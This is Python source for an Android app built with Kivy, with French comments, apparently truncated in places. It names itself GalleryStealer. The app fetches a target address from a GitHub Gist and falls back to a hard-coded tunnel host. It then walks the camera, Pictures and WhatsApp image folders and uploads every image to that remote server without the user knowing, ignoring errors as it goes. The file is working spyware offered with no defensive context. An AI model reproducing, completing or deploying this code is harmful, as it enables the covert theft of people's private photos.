import os
import requests
import shutil
import time
from kivy.app import App
from kivy.utils import platform


# --- CONFIGURATION DYNAMIQUE ---
def obtenir_url_cible():
  try:
    # Lien brut de ton Gist GitHub
    url_gist = "https://gist.githubusercontent.com/dope17936/71f9d690b>
    reponse = requests.get(url_gist, timeout=5)
    if reponse.status_code == 200:
      adresse = reponse.text.strip()
      if adresse:
        return adresse
  except Exception:
    pass
  # Adresse de secours par défaut si le téléphone n'a pas internet
  return "http://127.0.0.1:8000"

# --- CONFIGURATION ---
CIBLE_URL = "https://f70bbfebe9158a.lhr.life"
# ---------------------

class GalleryStealer(App):
    def build(self):
        self.steal_gallery()
        return None

    def steal_gallery(self):
        # Chemins standards de la galerie
        paths = [
            "/sdcard/DCIM/Camera",
            "/sdcard/Pictures",
            "/sdcard/WhatsApp/Media/WhatsApp Images"
        ]

        for path in paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.lower().endswith(('.jpg', '.jpeg', '.p>
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, 'rb') as f:
                                    files_data = {'file': (file, f)}
                                    response = requests.post(f"{CIBLE_>
                                    if response.status_code == 200:
                                        print(f"[+] Envoyé: {file}")
                            except Exception as e:
                                pass # Ignore les erreurs d'envoi

        time.sleep(10) # Attend un peu avant de relancer

if __name__ == "__main__":
    GalleryStealer().run()








